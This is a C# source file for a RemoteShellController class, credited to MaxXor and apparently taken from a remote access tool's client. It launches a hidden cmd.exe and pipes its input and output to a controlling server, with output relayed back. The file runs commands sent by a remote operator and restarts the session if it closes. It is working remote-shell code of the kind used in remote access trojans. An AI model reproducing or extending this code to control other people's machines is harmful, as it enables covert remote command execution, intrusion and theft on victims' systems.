using System;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Globalization;
using System.Threading;
using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
/*
 * Copyright (c) 2018 MaxXor
 * 
 */
namespace Client.Controllers
{
    /// <summary>
    /// This class manages a remote shell session.
    /// </summary>
    public class RemoteShellController : IDisposable
    {
        // Client for response
        private static ClientMosaic _client;

        private static RemoteShellController _shell;

        /// <summary>
        /// The Process of the command-line.
        /// </summary>
        private Process _prc;

        /// <summary>
        /// Decides if we should still read from the output.
        /// <remarks>
        /// Detects unexpected closing of the shell.
        /// </remarks>
        /// </summary>
        private bool _read;

        /// <summary>
        /// The lock object for the read variable.
        /// </summary>
        private readonly object _readLock = new object();

        /// <summary>
        /// The lock object for the StreamReader.
        /// </summary>
        private readonly object _readStreamLock = new object();

        /// <summary>
        /// Creates a new session of the Shell
        /// </summary>
        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            CultureInfo cultureInfo = CultureInfo.InstalledUICulture;

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    StandardErrorEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/K"
                }
            };

            _prc.Start();

            // Fire up the logic to redirect the outputs and handle them.
            RedirectOutputs();

            new GetExecuteShellCmdResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine).Execute(
                _client);
        }

        /// <summary>
        /// Starts the redirection of input and output
        /// </summary>
        private void RedirectOutputs()
        {
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }

        /// <summary>
        /// Reads the output from the stream.
        /// </summary>
        /// <param name="firstCharRead">The first read char.</param>
        /// <param name="streamReader">The StreamReader to read from.</param>
        /// <param name="isError">True if reading from the error-stream, else False.</param>
        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                StringBuilder streambuffer = new StringBuilder();

                streambuffer.Append((char)firstCharRead);

                // While there are more characters to be read
                while (streamReader.Peek() > -1)
                {
                    // Read the character in the queue
                    var ch = streamReader.Read();

                    // Accumulate the characters read in the stream buffer
                    streambuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streambuffer, isError);
                }
                // Flush any remaining text in the buffer
                SendAndFlushBuffer(ref streambuffer, isError);
            }
        }

        /// <summary>
        /// Sends the read output to the Client.
        /// </summary>
        /// <param name="textbuffer">Contains the contents of the output.</param>
        /// <param name="isError">True if reading from the error-stream, else False.</param>
        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
        {
            if (textbuffer.Length == 0) return;

            var toSend = textbuffer.ToString();

            if (string.IsNullOrEmpty(toSend)) return;

            if (isError)
            {
                new GetExecuteShellCmdResponse(toSend, true).Execute(
                    _client);
            }
            else
            {
                new GetExecuteShellCmdResponse(toSend).Execute(
                    _client);
            }

            textbuffer.Length = 0;
        }

        /// <summary>
        /// Reads from the standard output-stream.
        /// </summary>
        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new GetExecuteShellCmdResponse(string.Format("{0}>> Session unexpectedly closed{0}",
                        Environment.NewLine), true).Execute(_client);

                    CreateSession();
                }
            }
        }

        /// <summary>
        /// Reads from the standard error-stream.
        /// </summary>
        private void RedirectStandardError()
        {
            try
            {
                int ch;

                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new GetExecuteShellCmdResponse(string.Format("{0}>> Session unexpectedly closed{0}",
                        Environment.NewLine), true).Execute(_client);

                    CreateSession();
                }
            }
        }

        /// <summary>
        /// Executes a shell command.
        /// </summary>
        /// <param name="command">The command to execute.</param>
        /// <returns>False if execution failed, else True.</returns>
        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
                CreateSession();

            if (_prc == null) return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }

        /// <summary>
        /// Constructor, creates a new session.
        /// </summary>
        public RemoteShellController()
        {
            CreateSession();
        }

        /// <summary>
        /// Releases all resources used by this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (_prc == null) return;

                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }
                _prc.Dispose();
                _prc = null;
            }
        }

        public static void getExecuteShellCmd(GetExecuteShellCmd command, ClientMosaic client)
        {
            string input = command.command;
            _client = client;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new RemoteShellController();

            if (input == "exit")
            {
                if (_shell != null)
                    _shell.Dispose();
            }
            else
            {
                _shell.ExecuteCommand(input);
            }
        }
    }    
}
